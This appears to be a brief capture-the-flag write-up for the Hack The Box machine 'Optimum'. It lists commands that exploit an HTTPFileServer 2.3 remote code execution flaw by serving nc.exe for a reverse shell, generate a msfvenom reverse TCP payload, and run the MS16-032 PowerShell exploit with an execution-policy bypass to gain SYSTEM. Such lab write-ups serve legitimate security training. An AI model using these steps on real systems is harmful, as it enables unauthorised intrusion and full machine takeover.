# Optimum

### Full port scan

<figure><img src="../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

### HTTPFileServer 2.3 RCE

![](<../../.gitbook/assets/image (99).png>)

* HTTPFileServer 2.3

[https://www.exploit-db.com/exploits/39161](https://www.exploit-db.com/exploits/39161)

* Edit the local IP addr and port number

![](<../../.gitbook/assets/image (80).png>)

* `cp /usr/share/windows-resources/binaries/nc.exe .`
* `python3 -m http.server 80`
* `python2.7 39161 10.10.10.8 80`
* Obtained user shell

<figure><img src="../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

* Running windows exploit suggester

<figure><img src="../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

* `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o reverse.exe`
* Used [`https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1`](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1)
* Changed the payloads to `c:\\users\\kostas\\desktop\\reverse.exe`

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

* `c:\\windows\\sysnative\\windowspowershell\\v1.0\\powershell.exe -ep bypass .\\Invoke-MS16-032-Remote-Shell.ps1`
* Obtained ROOT

<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8aac527b-9509-4339-852b-de86325dd20d/Untitled.png)
